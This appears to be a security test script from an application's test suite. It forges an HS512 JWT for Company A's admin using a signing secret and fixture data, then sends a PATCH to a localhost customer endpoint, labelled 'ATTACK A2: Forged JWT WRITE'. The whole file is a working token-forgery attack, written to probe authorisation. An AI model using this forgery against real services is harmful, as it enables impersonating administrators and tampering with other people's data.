const axios = require('axios');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');

const API_URL = 'http://localhost:8080/api/v1';

async function main() {
  const fixtures = JSON.parse(fs.readFileSync(path.join(__dirname, '../fixtures.json'), 'utf8'));
  const companyAId = Object.keys(fixtures.companies).find(id => fixtures.companies[id].code === 'A');
  const compA = fixtures.companies[companyAId];
  
  // Forge token for Company A ADMIN
  const payload = {
    sub: compA.users.ADMIN.id,
    cid: companyAId,
    rid: 'afa1667a-deff-4c65-81df-5fa25e77670b' 
  };
  
  const token = jwt.sign(payload, '[REDACTED_SECRET]', { algorithm: 'HS512' });
  
  const client = axios.create({
    headers: { Authorization: `Bearer ${token}` },
    validateStatus: () => true
  });
  
  console.log("=== ATTACK A2: Forged JWT WRITE ===");
  const res = await client.patch(`${API_URL}/customers/${compA.entities.customerId}`, {
    name: 'Hacked by JWT Forgery'
  });
  console.log(`PATCH /customers/${compA.entities.customerId} -> Status: ${res.status}`);
  console.log(JSON.stringify(res.data, null, 2));
}

main().catch(console.error);
